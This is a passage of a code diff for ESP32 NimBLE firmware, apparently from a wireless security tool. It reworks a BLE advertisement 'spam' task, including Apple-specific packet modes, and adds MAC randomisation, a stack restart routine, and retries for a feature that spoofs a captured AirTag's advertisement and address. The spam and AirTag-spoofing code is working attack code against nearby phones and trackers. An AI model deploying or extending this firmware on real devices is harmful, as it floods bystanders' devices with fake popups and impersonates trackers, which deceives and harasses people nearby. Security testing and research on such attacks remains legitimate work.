-            struct ble_gap_adv_params adv_params;
-            memset(&adv_params, 0, sizeof(adv_params));
-            adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
-            adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
-
-            uint8_t own_addr_type;
-            if (ble_hs_id_infer_auto(0, &own_addr_type) == 0) {
-                uint32_t adv_ms = (esp_random() % 151) + 100;  // 100-250 ms
-                if (ble_gap_adv_start(own_addr_type, NULL, adv_ms, &adv_params, NULL, NULL) == 0) {
-                    spam_adv_count++;
-                }
+        if (use_full_adv) {
+            memcpy(adv_data, full_adv, full_adv_len);
+            adv_len = full_adv_len;
+        } else {
+            if (current_spam_type != BLE_SPAM_APPLE) {
+                adv_data[adv_len++] = 2;
+                adv_data[adv_len++] = 0x01;
+                adv_data[adv_len++] = 0x1A;
+            }
+            if (mfg_len > 0 && adv_len + mfg_len + 2 <= 31) {
+                adv_data[adv_len++] = mfg_len + 1;
+                adv_data[adv_len++] = 0xFF;
+                memcpy(&adv_data[adv_len], mfg_buf, mfg_len);
+                adv_len += mfg_len;
             }
         }
 
-        uint32_t sleep_ms = (esp_random() % 151) + 100; // match delay
-        vTaskDelay(pdMS_TO_TICKS(sleep_ms));
+        int rc = ble_gap_adv_set_data(adv_data, adv_len);
+        if (rc != 0) {
+            ESP_LOGE(TAG_BLE, "Failed to set advertisement data: %d", rc);
+            continue;
+        }
+
+        struct ble_gap_adv_params adv_params;
+        memset(&adv_params, 0, sizeof(adv_params));
+        // For Apple, use NON + GEN to get ADV_SCAN_IND; others use NON + NON (ADV_NONCONN_IND)
+        adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
+        adv_params.disc_mode = (current_spam_type == BLE_SPAM_APPLE)
+                                    ? BLE_GAP_DISC_MODE_GEN
+                                    : BLE_GAP_DISC_MODE_NON;
+        if (current_spam_type == BLE_SPAM_APPLE) {
+            // ~100ms
+            adv_params.itvl_min = 0xA0;
+            adv_params.itvl_max = 0xA0;
+        } else {
+            adv_params.itvl_min = 0x20;
+            adv_params.itvl_max = 0x30;
+        }
+        adv_params.channel_map = 0x07;
+
+        uint8_t own_addr_type;
+        rc = ble_hs_id_infer_auto(0, &own_addr_type);
+        if (rc != 0) {
+            ESP_LOGE(TAG_BLE, "Failed to infer address type: %d", rc);
+            continue;
+        }
+        own_addr_type = (current_spam_type == BLE_SPAM_APPLE)
+                             ? BLE_OWN_ADDR_PUBLIC
+                             : BLE_OWN_ADDR_RANDOM;
+        
+        uint32_t adv_ms = (esp_random() % 151) + 200;
+        rc = ble_gap_adv_start(own_addr_type, NULL, adv_ms, &adv_params, NULL, NULL);
+        if (rc != 0) {
+            ESP_LOGE(TAG_BLE, "Failed to start advertisement: %d", rc);
+            continue;
+        }
+
+        spam_adv_count++;
+        ESP_LOGD(TAG_BLE, "Successfully sent spam packet #%lu", (unsigned long)spam_adv_count);
+
+        uint32_t on_air_ms = (current_spam_type == BLE_SPAM_APPLE) ? 2000 : (adv_ms + 20);
+        vTaskDelay(pdMS_TO_TICKS(on_air_ms));
+        if (ble_gap_adv_active()) {
+            ble_gap_adv_stop();
+        }
+        uint32_t idle_delay_ms = (current_spam_type == BLE_SPAM_APPLE) ? 15 : ((esp_random() % 51) + 50);
+        vTaskDelay(pdMS_TO_TICKS(idle_delay_ms));
     }
-    spam_task_handle = NULL;
-    vTaskDelete(NULL);
+    
+    // task cleanup - let stop function handle deletion
+    vTaskSuspend(NULL);
 }
 
 static void notify_handlers(struct ble_gap_event *event, int len) {
@@ -224,11 +704,96 @@ static void generate_random_name(char *name, size_t max_len) {
 }
 
 static void generate_random_mac(uint8_t *mac_addr) {
-    esp_fill_random(mac_addr, 6);
+    int attempts = 0;
+    int ones;
+    
+    do {
+        esp_fill_random(mac_addr, 6);
+        
+        // set address type bits
+        if (esp_random() % 2 == 0) {
+            // static random address (bits 47:46 = 11)
+            mac_addr[5] |= 0xC0;
+        } else {
+            // non-resolvable private address (bits 47:46 = 00)  
+            mac_addr[5] &= 0x3F;
+        }
+        
+        // count bits set to 1 in random part (lower 46 bits)
+        ones = __builtin_popcount(mac_addr[0]);
+        ones += __builtin_popcount(mac_addr[1]);
+        ones += __builtin_popcount(mac_addr[2]);
+        ones += __builtin_popcount(mac_addr[3]);
+        ones += __builtin_popcount(mac_addr[4]);
+        ones += __builtin_popcount(mac_addr[5] & 0x3F);
+        
+        attempts++;
+        if (attempts > 10) {
+            // fallback: ensure at least one bit is set and not all bits are set
+            mac_addr[0] |= 0x01;  // set at least one bit
+            mac_addr[1] &= 0xFE;  // clear at least one bit
+            break;
+        }
+    } while (ones == 0 || ones == 46);
+}
 
-    mac_addr[0] |= 0xC0;
+// Function to restart the NimBLE stack after MAC address change
+static void restart_ble_stack(void) {
+    if (!ble_initialized) {
+        return;
+    }
+    
+    // Stop any active advertising
+    if (ble_gap_adv_active()) {
+        ble_gap_adv_stop();
+    }
+    
+    // Small delay to let stack settle
+    vTaskDelay(pdMS_TO_TICKS(10));
+    
+    // Stop the NimBLE stack and wait for the host task to exit before deinit
+    nimble_port_stop();
 
-    mac_addr[0] &= 0xFE;
+    // Wait for the nimble host task to exit (give it some time)
+    if (nimble_host_task_handle != NULL) {
+        int wait_iterations = 0;
+        while (eTaskGetState(nimble_host_task_handle) != eDeleted && wait_iterations < 25) {
+            vTaskDelay(pdMS_TO_TICKS(20));
+            wait_iterations++;
+        }
+
+        if (eTaskGetState(nimble_host_task_handle) != eDeleted) {
+            ESP_LOGW(TAG_BLE, "nimble_host_task did not exit in time, deleting task");
+            vTaskDelete(nimble_host_task_handle);
+            vTaskDelay(pdMS_TO_TICKS(20));
+        }
+        nimble_host_task_handle = NULL;
+    }
+
+    // Now deinitialize the port
+    nimble_port_deinit();
+    
+    // Small delay before reinitializing
+    vTaskDelay(pdMS_TO_TICKS(50));
+    
+    // Reinitialize the NimBLE stack
+    int ret = nimble_port_init();
+    if (ret != 0) {
+        ESP_LOGE(TAG_BLE, "Failed to reinit nimble port: %d", ret);
+        return;
+    }
+    
+    // Restart the NimBLE host task
+    xTaskCreate(nimble_host_task, "nimble_host", 4096, NULL, 5, &nimble_host_task_handle);
+    
+    // Wait for NimBLE stack to be ready
+    vTaskDelay(pdMS_TO_TICKS(100));
+    
+    // Reconfigure BLE stack for random addresses
+    ble_hs_cfg.sm_our_key_dist |= BLE_SM_PAIR_KEY_DIST_ID;
+    ble_hs_cfg.sm_their_key_dist |= BLE_SM_PAIR_KEY_DIST_ID;
+    
+    ESP_LOGI(TAG_BLE, "BLE stack restarted successfully");
 }
 
 void stop_ble_stack() {
@@ -722,12 +1287,142 @@ void ble_start_spoofing_selected_airtag(void) {
     }
 
 
-    // Set the advertisement data
-    rc = ble_gap_adv_set_data(tag_to_spoof->payload, tag_to_spoof->payload_len);
+    ESP_LOGI(TAG_BLE, "Preparing spoof adv: captured_len=%zu mfg_len=%zu mfg_ptr=%p",
+             tag_to_spoof->payload_len, mfg_data_len, (void*)mfg_data_start);
+
+    uint8_t adv_buf[31];
+    size_t adv_len = 0;
+
+    adv_buf[adv_len++] = 0x02;
+    adv_buf[adv_len++] = 0x01;
+    adv_buf[adv_len++] = 0x1A;
+
+    if (mfg_data_start && mfg_data_len > 0) {
+        size_t space = sizeof(adv_buf) - adv_len;
+        if (space >= 2) {
+            size_t copy_len = mfg_data_len;
+            if (copy_len > space - 2) copy_len = space - 2;
+            adv_buf[adv_len++] = (uint8_t)(copy_len + 1);
+            adv_buf[adv_len++] = 0xFF;
+            memcpy(&adv_buf[adv_len], mfg_data_start, copy_len);
+            adv_len += copy_len;
+            if (copy_len < mfg_data_len) {
+                ESP_LOGW(TAG_BLE, "Truncated manufacturer data from %zu to %zu bytes", mfg_data_len, copy_len);
+            }
+        }
+    } else if (tag_to_spoof->payload_len > 2) {
+        size_t space = sizeof(adv_buf) - adv_len;
+        size_t use = tag_to_spoof->payload_len - 2;
+        if (use > space - 2) use = space - 2;
+        adv_buf[adv_len++] = (uint8_t)(use + 1);
+        adv_buf[adv_len++] = 0xFF;
+        memcpy(&adv_buf[adv_len], &tag_to_spoof->payload[2], use);
+        adv_len += use;
+        ESP_LOGI(TAG_BLE, "Using raw payload slice for manufacturer data, used=%zu", use);
+    }
+
+    size_t dump_len = adv_len < 16 ? adv_len : 16;
+    char hdump[3 * 16 + 1];
+    for (size_t i = 0; i < dump_len; i++) sprintf(&hdump[i * 3], "%02X ", adv_buf[i]);
+    hdump[dump_len * 3] = '\0';
+    ESP_LOGI(TAG_BLE, "Final adv_buf len=%zu data[0..%zu]=%s", adv_len, dump_len, hdump);
+
+    if (ble_gap_adv_active()) {
+        ble_gap_adv_stop();
+        vTaskDelay(pdMS_TO_TICKS(20));
+    }
+
+    /* Clear any existing adv and scan rsp data on controller to free memory */
+    (void)ble_gap_adv_set_data(NULL, 0);
+    (void)ble_gap_adv_rsp_set_data(NULL, 0);
+    vTaskDelay(pdMS_TO_TICKS(10));
+
+    rc = ble_gap_adv_set_data(adv_buf, adv_len);
     if (rc != 0) {
-        ESP_LOGE(TAG_BLE, "Error setting advertisement data; rc=%d", rc);
+        ESP_LOGW(TAG_BLE, "Initial ble_gap_adv_set_data failed rc=%d; will retry with backoff and further truncation", rc);
         TERMINAL_VIEW_ADD_TEXT("Error setting adv data; rc=%d\n", rc);
-        return;
+
+        /* Try a few retry attempts with longer delays and progressively smaller manufacturer data */
+        int retry_count = 3;
+        int attempt = 0;
+        int base_shrink = 3; /* bytes to remove per retry */
+        int last_rc = rc;
+
+        for (attempt = 1; attempt <= retry_count; attempt++) {
+            vTaskDelay(pdMS_TO_TICKS(100 * attempt));
+
+            /* rebuild adv_buf with reduced manufacturer data */
+            size_t new_adv_len = 0;
+            uint8_t tmp_buf[31];
+            tmp_buf[new_adv_len++] = 0x02;
+            tmp_buf[new_adv_len++] = 0x01;
+            tmp_buf[new_adv_len++] = 0x1A;
+
+            if (mfg_data_start && mfg_data_len > 0) {
+                size_t space = sizeof(tmp_buf) - new_adv_len;
+                if (space >= 2) {
+                    /* reduce copy length progressively */
+                    size_t copy_len = mfg_data_len;
+                    if (copy_len > space - 2) copy_len = space - 2;
+                    size_t shrink = (size_t)(base_shrink * attempt);
+                    if (shrink >= copy_len) copy_len = 0;
+                    else copy_len -= shrink;
+
+                    if (copy_len > 0) {
+                        tmp_buf[new_adv_len++] = (uint8_t)(copy_len + 1);
+                        tmp_buf[new_adv_len++] = 0xFF;
+                        memcpy(&tmp_buf[new_adv_len], mfg_data_start, copy_len);
+                        new_adv_len += copy_len;
+                    }
+                }
+            } else if (tag_to_spoof->payload_len > 2) {
+                size_t space = sizeof(tmp_buf) - new_adv_len;
+                size_t use = tag_to_spoof->payload_len - 2;
+                if (use > space - 2) use = space - 2;
+                size_t shrink = (size_t)(base_shrink * attempt);
+                if (shrink >= use) use = 0;
+                else use -= shrink;
+                if (use > 0) {
+                    tmp_buf[new_adv_len++] = (uint8_t)(use + 1);
+                    tmp_buf[new_adv_len++] = 0xFF;
+                    memcpy(&tmp_buf[new_adv_len], &tag_to_spoof->payload[2], use);
+                    new_adv_len += use;
+                }
+            }
+
+            size_t dump_len2 = new_adv_len < 16 ? new_adv_len : 16;
+            char hdump2[3 * 16 + 1];
+            for (size_t i = 0; i < dump_len2; i++) sprintf(&hdump2[i * 3], "%02X ", tmp_buf[i]);
+            hdump2[dump_len2 * 3] = '\0';
+            ESP_LOGI(TAG_BLE, "Retry %d: trying adv len=%zu data[0..%zu]=%s", attempt, new_adv_len, dump_len2, hdump2);
+
+            if (ble_gap_adv_active()) {
+                ble_gap_adv_stop();
+                vTaskDelay(pdMS_TO_TICKS(20));
+            }
+
+            /* Clear previous data before retry setting new */
+            (void)ble_gap_adv_set_data(NULL, 0);
+            (void)ble_gap_adv_rsp_set_data(NULL, 0);
+            vTaskDelay(pdMS_TO_TICKS(10));
+
+            last_rc = ble_gap_adv_set_data(tmp_buf, new_adv_len);
+            if (last_rc == 0) {
+                /* success: copy tmp_buf into adv_buf for subsequent start */
+                memcpy(adv_buf, tmp_buf, new_adv_len);
+                adv_len = new_adv_len;
+                rc = 0;
+                break;
+            }
+
+            ESP_LOGW(TAG_BLE, "Retry %d ble_gap_adv_set_data failed rc=%d", attempt, last_rc);
+        }
+
+        if (last_rc != 0) {
+            ESP_LOGE(TAG_BLE, "All retries failed setting adv data, giving up (last rc=%d)", last_rc);
+            TERMINAL_VIEW_ADD_TEXT("Failed setting adv data after retries; rc=%d\n", last_rc);
+            return;
+        }
     }
 
     // Configure advertisement parameters
@@ -743,11 +1438,20 @@ void ble_start_spoofing_selected_airtag(void) {
     // AirTags typically use Random Static addresses.
     // Check the address type. We can usually only spoof Random addresses.
     if (tag_to_spoof->addr.type == BLE_ADDR_RANDOM) {
-        rc = ble_hs_id_set_rnd(tag_to_spoof->addr.val); // Set the stack's random address
+        uint8_t rnd_addr[6];
+        memcpy(rnd_addr, tag_to_spoof->addr.val, 6);
+        if ((rnd_addr[5] & 0xC0) == 0xC0) {
+            rc = ble_hs_id_set_rnd(rnd_addr);
+        } else {
+            rnd_addr[5] = (rnd_addr[5] & 0x3F) | 0xC0;
+            if ((rnd_addr[0] | rnd_addr[1] | rnd_addr[2] | rnd_addr[3] | rnd_addr[4] | (rnd_addr[5] & 0x3F)) == 0x00) {
+                rnd_addr[0] = 0x01;
+            }
+            rc = ble_hs_id_set_rnd(rnd_addr);
+        }
         if (rc != 0) {
             ESP_LOGE(TAG_BLE, "Failed to set random address for spoofing; rc=%d", rc);
             TERMINAL_VIEW_ADD_TEXT("Error: Failed set spoof rnd addr; rc=%d\n", rc);
-            // Fallback to default address
             rc = ble_hs_id_infer_auto(0, &own_addr_type);
             if (rc != 0) {
                 ESP_LOGE(TAG_BLE, "Error inferring own address; rc=%d", rc);
@@ -757,7 +1461,6 @@ void ble_start_spoofing_selected_airtag(void) {
             ESP_LOGW(TAG_BLE, "Using default inferred address type %d", own_addr_type);
             TERMINAL_VIEW_ADD_TEXT("Warn: Using default address.\n");
         } else {
-            // If setting random address succeeded, use it for advertising
             own_addr_type = BLE_OWN_ADDR_RANDOM;
             ESP_LOGI(TAG_BLE, "Set random address successfully. Advertising with type %d", own_addr_type);
             TERMINAL_VIEW_ADD_TEXT("Using spoofed random address.\n");
@@ -903,6 +1606,13 @@ esp_err_t ble_unregister_handler(ble_data_handler_t handler) {
 
 void ble_init(void) {
 #ifndef CONFIG_IDF_TARGET_ESP32S2
+    // --- Memory check before BLE init ---
+    size_t free_heap = heap_caps_get_free_size(MALLOC_CAP_8BIT);
+    if (free_heap < (45 * 1024)) {
+        ESP_LOGW(TAG_BLE, "WARNING: Less than 45KB of free RAM available (%d bytes). BLE may fail to initialize!", (int)free_heap);
+        TERMINAL_VIEW_ADD_TEXT("WARNING: <45KB RAM free (%d bytes). BLE may not initialize!\n", (int)free_heap);
+    }
+
     if (!ble_initialized) {
         esp_err_t ret = nvs_flash_init();
         if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
@@ -931,7 +1641,18 @@ void ble_init(void) {
         }
 
         // Configure and start the NimBLE host task
-        xTaskCreate(nimble_host_task, "nimble_host", 4096, NULL, 5, NULL);
+        xTaskCreate(nimble_host_task, "nimble_host", 4096, NULL, 5, &nimble_host_task_handle);
+        
+        // Wait for NimBLE stack to be ready
+        vTaskDelay(pdMS_TO_TICKS(100));
+        
+        // Configure BLE stack to use random addresses by default for spam functionality
+        // This is equivalent to NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM)
+        // and fixes MAC randomization issues
+        ble_hs_cfg.sm_our_key_dist |= BLE_SM_PAIR_KEY_DIST_ID;
+        ble_hs_cfg.sm_their_key_dist |= BLE_SM_PAIR_KEY_DIST_ID;
+        
+        ESP_LOGI(TAG_BLE, "BLE configured for random address support");
 
         ble_initialized = true;
         ESP_LOGI(TAG_BLE, "BLE initialized");
@@ -955,6 +1676,13 @@ void ble_deinit(void) {
 
         nimble_port_stop();
         nimble_port_deinit();
+        
+        // Wait for nimble host task to finish and clean up
+        if (nimble_host_task_handle != NULL) {
+            vTaskDelay(pdMS_TO_TICKS(100));
+            nimble_host_task_handle = NULL;
+        }
+        
         ble_initialized = false;
         ESP_LOGI(TAG_BLE, "BLE deinitialized successfully.");
         TERMINAL_VIEW_ADD_TEXT("BLE deinitialized successfully.\n");
@@ -1033,13 +1761,34 @@ void ble_start_raw_ble_packetscan(void) {
 }
 
 void ble_start_airtag_scanner(void) {
+    ESP_LOGI(TAG_BLE, "Starting AirTag scanner: active scan, duplicates allowed, larger window");
     ble_register_handler(airtag_scanner_callback);
-    ble_start_scanning();
-    // Reset discovered count when starting a new scan session? Or keep appending?
-    // Let's keep appending for now. Add a command to clear if needed later.
-    // discovered_airtag_count = 0;
-    // airTagCount = 0;
-    // selected_airtag_index = -1;
+
+    if (!ble_initialized) {
+        ble_init();
+    }
+
+    if (!wait_for_ble_ready()) {
+        ESP_LOGE(TAG_BLE, "BLE stack not ready for AirTag scanner");
+        return;
+    }
+
+    struct ble_gap_disc_params disc_params = {0};
+    disc_params.itvl = 0x30; // ~30ms (0.625ms units)
+    disc_params.window = 0x30; // full window to increase listen time
+    disc_params.filter_policy = 0; // accept all
+    disc_params.limited = 0;
+    disc_params.passive = 0; // active scanning to get scan response
+    disc_params.filter_duplicates = 0; // deliver duplicates
+    disc_params.disable_observer_mode = 0;
+
+    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, BLE_HS_FOREVER, &disc_params, ble_gap_event_general, NULL);
+    if (rc != 0) {
+        ESP_LOGE(TAG_BLE, "Error starting AirTag BLE scan; rc=%d", rc);
+        TERMINAL_VIEW_ADD_TEXT("Error starting AirTag scan\n");
+    } else {
+        ESP_LOGI(TAG_BLE, "AirTag scanning started");
+    }
 }
 
 static void ble_pcap_callback(struct ble_gap_event *event, size_t len) {
@@ -1175,6 +1924,7 @@ void ble_list_flippers(void) {
         TERMINAL_VIEW_ADD_TEXT("No Flippers discovered yet.\n");
         return;
     }
+   
     for (int i = 0; i < discovered_flipper_count; i++) {
         char mac[18];
         snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x",
@@ -1296,7 +2046,16 @@ void ble_start_ble_spam(ble_spam_type_t type) {
     if (spam_running) {
         printf("spam already running, stopping first...\n");
         ble_stop_ble_spam();
-        vTaskDelay(pdMS_TO_TICKS(200));
+        vTaskDelay(pdMS_TO_TICKS(500));
+    }
+
+    if (spam_task_handle != NULL) {
+        printf("cleaning up previous spam task...\n");
+        if (eTaskGetState(spam_task_handle) != eDeleted) {
+            vTaskDelete(spam_task_handle);
+        }
+        spam_task_handle = NULL;
+        vTaskDelay(pdMS_TO_TICKS(100));
     }
 
     if (!ble_initialized) {
@@ -1312,9 +2071,14 @@ void ble_start_ble_spam(ble_spam_type_t type) {
     spam_adv_count = 0;
     spam_running = true;
 
-    if (xTaskCreate(spam_task, "ble_spam", 4096, NULL, 5, &spam_task_handle) != pdPASS) {
-        printf("failed to create spam task\n");
+    BaseType_t task_result = xTaskCreate(spam_task, "ble_spam", 4096, NULL, 5, &spam_task_handle);
+    if (task_result != pdPASS) {
+        printf("failed to create spam task (error: %d)\n", task_result);
+        if (task_result == errCOULD_NOT_ALLOCATE_REQUIRED_MEMORY) {
+            printf("insufficient memory for spam task\n");
+        }
         spam_running = false;
+        spam_task_handle = NULL;
         return;
     }
 
@@ -1324,9 +2088,15 @@ void ble_start_ble_spam(ble_spam_type_t type) {
             .arg = NULL,
             .name = "spam_log"
         };
-        esp_timer_create(&targs, &spam_log_timer);
+        esp_err_t timer_result = esp_timer_create(&targs, &spam_log_timer);
+        if (timer_result != ESP_OK) {
+            printf("failed to create spam log timer (error: %d)\n", timer_result);
+        }
     }
-    esp_timer_start_periodic(spam_log_timer, spam_log_interval_ms * 1000);
+    
+    if (spam_log_timer != NULL) {
+        esp_timer_start_periodic(spam_log_timer, spam_log_interval_ms * 1000);
+    }
 
     const char *type_name = "unknown";
     switch (type) {
@@ -1341,14 +2111,19 @@ void ble_start_ble_spam(ble_spam_type_t type) {
 }
 
 void ble_stop_ble_spam(void) {
+    if (!spam_running) {
+        return;
+    }
+    
     spam_running = false;
     
     if (spam_task_handle != NULL) {
-        vTaskDelay(pdMS_TO_TICKS(150));
-        if (spam_task_handle != NULL) {
+        vTaskDelay(pdMS_TO_TICKS(500));
+        
+        if (eTaskGetState(spam_task_handle) != eDeleted) {
             vTaskDelete(spam_task_handle);
-            spam_task_handle = NULL;
         }
+        spam_task_handle = NULL;
     }
     
     if (spam_log_timer) {
